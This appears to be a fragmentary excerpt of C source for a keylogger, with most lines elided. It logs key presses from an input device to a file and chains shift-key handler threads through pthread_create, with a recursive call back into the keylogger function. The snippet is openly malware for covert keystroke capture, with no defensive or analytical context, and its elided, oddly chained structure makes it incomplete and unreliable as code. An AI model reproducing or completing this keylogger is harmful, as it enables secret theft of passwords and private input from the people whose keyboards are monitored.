...
/* Space */     case 57 : fputs(" ", file_log); fclose(file_log); keylogger(deviceFile);
    ...
    if(pthread_create(&thread_Rshift_key, NULL, (void*(*)(void*))Rshift_used, deviceFile) == -1)
...
void *Rshift_used(char *deviceFile)
{
    ...
    if(pthread_create(&thread_Lshift_key, NULL, (void*(*)(void*))Lshift_used, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");
}
...
void *Lshift_used(char *deviceFile)
{
    ...
    if(pthread_create(&thread_Rshift_key_sustain, NULL, (void*(*)(void*))Rshift_used_sustained, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");
}
...
void *Rshift_used_sustained(char *deviceFile)
{
    ...
    if(pthread_create(&thread_Lshift_key_sustain, NULL, (void*(*)(void*))Lshift_used_sustained, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");
}
